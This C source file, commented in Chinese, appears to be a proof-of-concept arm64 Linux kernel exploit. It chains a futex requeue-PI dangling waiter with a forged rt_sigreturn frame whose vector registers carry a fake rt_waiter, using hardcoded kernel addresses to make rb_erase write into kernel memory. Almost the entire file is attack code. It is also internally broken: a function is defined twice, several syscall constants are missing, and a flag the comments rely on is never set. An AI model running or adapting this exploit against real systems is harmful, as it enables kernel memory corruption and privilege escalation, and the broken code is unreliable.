/* PD2238 sigreturn 验证 v3 — 使用精确的字节偏移构造合法 sigframe.
 *
 * arm64 rt_sigframe 布局 (从用户 SP 开始):
 *   +0x000: struct siginfo info[128B]     (内核不读内容)
 *   +0x080: struct ucontext uc:
 *     uc+0x000: uc_flags (8B, 不读)
 *     uc+0x008: uc_link (8B, 不读)
 *     uc+0x010: stack_t uc_stack (24B, 错误被吞)
 *     uc+0x028: sigset_t uc_sigmask (128B → set_current_blocked)
 *     uc+0x0A8: __u8 __unused[128]
 *     uc+0x128: struct sigcontext uc_mcontext:
 *       mc+0x000: fault_address (8B)
 *       mc+0x008: regs[31] (248B)
 *       mc+0x100: sp (8B)
 *       mc+0x108: pc (8B) ← sigreturn 跳转目标!
 *       mc+0x110: pstate (8B) ← 必须 EL0t 合法 (DAIF=0, 非32bit)
 *       mc+0x118: __reserved[4096]:
 *         reserved+0x00: _aarch64_ctx {magic=u32, size=u32}
 *           magic = 0x46508001 (FPSIMD_MAGIC)
 *           size = 0x210 (= sizeof(struct fpsimd_context))
 *         reserved+0x08: fpsr (u32), fpcr (u32)
 *         reserved+0x10: vregs[512B] ← 完全用户可控! 放 fake rt_waiter!
 *         reserved+0x218: terminator {magic=0, size=0}
 *
 * fake rt_waiter (5.10 flat, 80B) 放在 vregs 开头:
 *   +0x00 tree.pc=parent(写值)
 *   +0x08 tree.right=0
 *   +0x10 tree.left=&sysctl_bootid (rb_erase 写入目标)
 *   +0x18 pi_tree.pc=parent
 *   +0x20 pi_tree.right=0
 *   +0x28 pi_tree.left=&sysctl_bootid
 *   +0x30 task=INIT_TASK
 *   +0x38 lock=SCRATCH
 *   +0x40 prio=3
 */
static long sys(long n,long a,long b,long c,long d,long e,long f){
  register long x8 __asm__("x8")=n; register long x0 __asm__("x0")=a;
  register long x1 __asm__("x1")=b; register long x2 __asm__("x2")=c;
  register long x3 __asm__("x3")=d; register long x4 __asm__("x4")=e;
  register long x5 __asm__("x5")=f;
  __asm__ volatile("svc #0":"+r"(x0):"r"(x8),"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5):"memory");
  return x0;
}
#define SYS_write 64
#define SYS_nanosleep 101
#define SYS_futex 98
#define SYS_clock_gettime 113
#define SYS_gettid 178
#define SYS_rt_sigreturn 139
#define SYS_mkdirat 34
#define SYS_mount 40
#define SYS_openat 56
#define SYS_close 57
#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define CLOCK_MONOTONIC 1
#define AT_FDCWD -100
#define CLONE_FLAGS 0x50f00

#define KBASE            0xffffffc008000000UL
#define SYSCTL_BOOTID    (KBASE + 0x02ee910dUL)
#define INIT_TASK        (KBASE + 0x02aec240UL)
#define SCRATCH          (KBASE + 0x02e90000UL)

static void puts_(const char*s){long n=0;while(s[n])n++;sys(SYS_write,1,(long)s,n,0,0,0);}
static void putx_(unsigned long v){
  char b[18]; b[0]='0'; b[1]='x';
  for(int i=0;i<16;i++){ int nib=(v>>((15-i)*4))&0xf; b[2+i]= nib<10?('0'+nib):('a'+nib-10); }
  sys(SYS_write,1,(long)b,18,0,0,0);
}
static void nsleep_us(long us){long ts[2]={us/1000000,(us%1000000)*1000};sys(SYS_nanosleep,(long)ts,0,0,0,0,0);}
static void show_bootid(const char*tag){
  char buf[64]; for(int i=0;i<64;i++) buf[i]=0;
  long fd=sys(SYS_openat,AT_FDCWD,(long)"/proc/sys/kernel/random/boot_id",0,0,0,0);
  puts_(tag);
  if(fd<0){ puts_("<err>\n"); return; }
  long n=sys(SYS_read,fd,(long)buf,60,0,0,0);
  sys(SYS_close,fd,0,0,0,0,0);
  if(n>0) sys(SYS_write,1,(long)buf,n,0,0,0);
  puts_("\n");
}
__attribute__((naked)) static long thr_clone(long flags,void*stack,int(*fn)(void*),void*arg){
  __asm__ volatile(
    "mov x9, x2\n" "mov x10, x3\n"
    "mov x2, #0\n" "mov x3, #0\n" "mov x4, #0\n"
    "mov x8, #220\n" "svc #0\n"
    "cbnz x0, 1f\n"
    "mov x0, x10\n" "blr x9\n"
    "mov x8, #93\n" "svc #0\n"
    "1:\n" "ret\n");
}

volatile unsigned int f_wait, f_pi_target, f_pi_chain;
volatile int waiter_ready, owner_started, waiter_waiting, armed;
volatile long waiter_tid;
static char wstack[65536] __attribute__((aligned(16)));
static char ostack[65536] __attribute__((aligned(16)));
static char cstack[65536] __attribute__((aligned(16)));

struct sched_attr{unsigned int size;unsigned int policy;unsigned long long flags;
  int nice;unsigned int priority;unsigned long long runtime,deadline,period;};
static int consumer_fn(void*a){
  (void)a;
  while(!armed) nsleep_us(1000);
  puts_("CONSUMER_ON\n");
  long i=0;
  while(armed){
    struct sched_attr at; char*p=(char*)&at; for(unsigned k=0;k<sizeof(at);k++)p[k]=0;
    at.size=sizeof(at);
    at.policy=(i&1)?SCHED_BATCH:SCHED_OTHER;
    at.nice=(int)(i%19)+1;
    sys(SYS_sched_setattr,waiter_tid,(long)&at,0,0,0,0);
    i++;
    nsleep_us(5000);
  }
  puts_("CONSUMER_OFF\n");
  for(;;) nsleep_us(500000);
}
static int owner_fn(void*a){
  (void)a;
  sys(SYS_futex,(long)&f_pi_target,FUTEX_LOCK_PI,0,0,0,0);
  while(!waiter_ready) nsleep_us(1000);
  owner_started=1;
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  for(;;) nsleep_us(500000);
}

/* ===== sigframe 构造 ===== */
static unsigned char sigframe_buf[0x1500] __attribute__((aligned(16)));

static void build_sigframe(void){
  /* 全零初始化 (terminator 自动为 magic=0,size=0) */
  for(int i=0;i<(int)sizeof(sigframe_buf);i++) sigframe_buf[i]=0;

  /* uc_mcontext.__reserved 在 sigframe 内的偏移 = 0x248
   * 计算: siginfo(0x80) + uc_flags(8) + uc_link(8) + uc_stack(24)
   *       + uc_sigmask(128) + __unused(128)
   *       + fault_addr(8) + regs[31](248) + sp(8) + pc(8) + pstate(8)
   *       = 0x80 + 8 + 8 + 24 + 128 + 128 + 8 + 248 + 8 + 8 + 8 = 0x248 ✓ */
  unsigned char *res = sigframe_buf + 0x248;

  /* fpsimd_context 放 reserved 开头 */
  *(unsigned int*)(res + 0x00) = 0x46508001;  /* FPSIMD_MAGIC */
  *(unsigned int*)(res + 0x04) = 0x210;       /* size = sizeof(fpsimd_context) */
  *(unsigned int*)(res + 0x08) = 0;            /* fpsr */
  *(unsigned int*)(res + 0x0C) = 0;            /* fpcr */

  /* vregs 从 res+0x10 开始 (512B) — 填 fake rt_waiter (5.10 flat) */
  unsigned long *v = (unsigned long*)(res + 0x10);
  unsigned long parent = SCRATCH + 0x108;
  unsigned long lock = SCRATCH;
  v[0x00/8] = parent;              /* tree.pc (写值) */
  v[0x08/8] = 0;                   /* tree.right */
  v[0x10/8] = SYSCTL_BOOTID;       /* tree.left (rb_erase 写入目标) */
  v[0x18/8] = parent;              /* pi_tree.pc */
  v[0x20/8] = 0;                   /* pi_tree.right */
  v[0x28/8] = SYSCTL_BOOTID;       /* pi_tree.left */
  v[0x30/8] = INIT_TASK;           /* task */
  v[0x38/8] = lock;                /* lock */
  v[0x40/8] = 3;                   /* prio */
  /* 其余 vregs 为零 */

  /* reserved 后面放 terminator (magic=0,size=0 已由全零保证) */

  /* 设置返回 PC 到死循环 (保持内核栈内容) */
  unsigned long *mc_regs = (unsigned long*)(sigframe_buf + 0x128 + 0x08);
  mc_regs[30] = 0;  /* regs[29] = frame pointer = 0 */
  /* pc 和 sp 由外部设置 (见下) */
}

/* sigreturn 跳回这里: 死循环保持内核栈 */
static void after_sigreturn_loop(void){
  puts_("SIGRETURN_LOOP_REACHED\n");
  volatile unsigned long x=0;
  for(;;){ x++; if(!x) x=1; }
}

static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  puts_("WTID="); putx_((unsigned long)waiter_tid); puts_("\n");
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("W_RET(pib_dangling)\n");

  /* 构造 sigframe 并触发 rt_sigreturn */
  build_sigframe();

  /* 设置 sigframe 内的 pc → after_sigreturn_loop */
  /* uc_mcontext 在 sigframe+0x128, pc 在 mcontext+0x108 → 总偏移 0x230 */
  unsigned long target_pc = (unsigned long)&after_sigreturn_loop;
  __builtin_memcpy(sigframe_buf + 0x128 + 0x108, &target_pc, 8);
  /* sp 设为某个安全值 */
  unsigned long new_sp = (unsigned long)(sigframe_buf + sizeof(sigframe_buf) - 0x100);
  __builtin_memcpy(sigframe_buf + 0x128 + 0x100, &new_sp, 8);

  puts_("CALL_SIGRETURN\n");

  /* 把 sigframe 拷到当前用户栈顶附近, 然后设 SP 并 svc rt_sigreturn */
  /* 方法: 直接把 SP 设为 sigframe_buf 地址 (它在 .bss, 是"用户内存") */
  __asm__ volatile(
    "mov sp, %0\n"
    "mov x8, #139\n"        /* SYS_rt_sigreturn */
    "svc #0\n"
    : : "r" (sigframe_buf) : "x8", "sp"
  );
  /* 如果到这说明 sigreturn 失败 (badframe) */
  puts_("SIGRETURN_BADFRAME\n");
  for(;;) nsleep_us(500000);
}
static int owner_fn(void*a){
  (void)a;
  sys(SYS_futex,(long)&f_pi_target,FUTEX_LOCK_PI,0,0,0,0);
  while(!waiter_ready) nsleep_us(1000);
  owner_started=1;
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  for(;;) nsleep_us(500000);
}

void _start(void){
  puts_("\n=== SIGRET-V3 ===\n");
  sys(SYS_mkdirat,AT_FDCWD,(long)"/proc",0755,0,0,0);
  sys(SYS_mount,(long)"proc",(long)"/proc",(long)"proc",0,0,0);
  show_bootid("BOOTID_BEFORE=");
  thr_clone(CLONE_FLAGS,ostack+sizeof(ostack),owner_fn,0);
  thr_clone(CLONE_FLAGS,wstack+sizeof(wstack),waiter_fn,0);
  thr_clone(CLONE_FLAGS,cstack+sizeof(cstack),consumer_fn,0);
  while(!waiter_waiting || !owner_started) nsleep_us(1000);
  nsleep_us(100000);
  sys(SYS_futex,(long)&f_wait,FUTEX_CMP_REQUEUE_PI,1,1,(long)&f_pi_target,0);
  puts_("REQUEUE_DONE\n");
  /* 等 consumer 完成打点 (armed 由 waiter 在 pselect 后设置) */
  nsleep_us(30000000);  /* 30 秒窗口 */
  armed=0;
  show_bootid("BOOTID_AFTER=");
  puts_("=== SIGRET-V3-DONE ===\n");
  for(;;) nsleep_us(500000);
}
